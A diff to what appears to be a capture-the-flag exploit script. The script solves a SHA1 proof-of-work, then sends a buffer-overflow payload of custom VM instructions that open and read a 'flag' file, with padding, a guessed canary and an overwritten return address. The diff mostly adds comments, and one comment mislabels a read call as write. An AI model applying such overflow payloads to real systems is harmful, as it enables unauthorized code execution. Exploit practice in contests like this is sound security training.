@@ -28,6 +28,7 @@ prefix = r.recvuntil("\n")[:-1]
 print prefix
 
 i = 0
+
 while True:
 	h = prefix + str(i).zfill(8)
 	sha = new("SHA1")
@@ -41,25 +42,25 @@ r.sendline(h)
 
 print r.recvuntil("name>")
 
-payload = "flag\x00"
-payload += inst(4, 1, 0, 0x1)
-payload += inst(4, 1, 1, 0xf5f9e)
-payload += inst(8, 0, 0, 0)
+payload = "flag\x00" 			# 0xf5f9e
+payload += inst(4, 1, 0, 0x1)		# r0 = 1
+payload += inst(4, 1, 1, 0xf5f9e)	# r1 = "flag\x00"
+payload += inst(8, 0, 0, 0)		# open("flag\x00")
 
-payload += inst(4, 1, 1, 0x2)
-payload += inst(4, 1, 2, 0xf5f00)
-payload += inst(4, 1, 3, 0x40)
-payload += inst(4, 1, 0, 0x3)
-payload += inst(8, 0, 0, 0)
+payload += inst(4, 1, 0, 0x3)		# r0 = 3, write
+payload += inst(4, 1, 1, 0x2)		# r1 = 2, fd(stdin, stdout, flag)
+payload += inst(4, 1, 2, 0xf5f00)	# r2 = 0xf5f00, buf
+payload += inst(4, 1, 3, 0x40)		# r3 = 0x40, len
+payload += inst(8, 0, 0, 0)		# read(2, buf, 0x40)
 
-payload += inst(4, 1, 1, 0x1)
-payload += inst(4, 1, 0, 0x2)
-payload += inst(8, 0, 0, 0)
+payload += inst(4, 1, 0, 0x2)           # r0 = 2, write
+payload += inst(4, 1, 1, 0x1)		# r1 = 1, fd
+payload += inst(8, 0, 0, 0)		# write(1, buf, 0x40)
 
-payload += "A" * (57-len(payload))
-payload += p21(0x12345)
-payload += p21(0x4141)
-payload += p21(0xf5f9e+5)
+payload += "A" * (57-len(payload))	# padding
+payload += p21(0x12345)			# canary
+payload += p21(0x4141)			# bp
+payload += p21(0xf5f9e+5)		# pc
 
 r.sendline(payload)
 
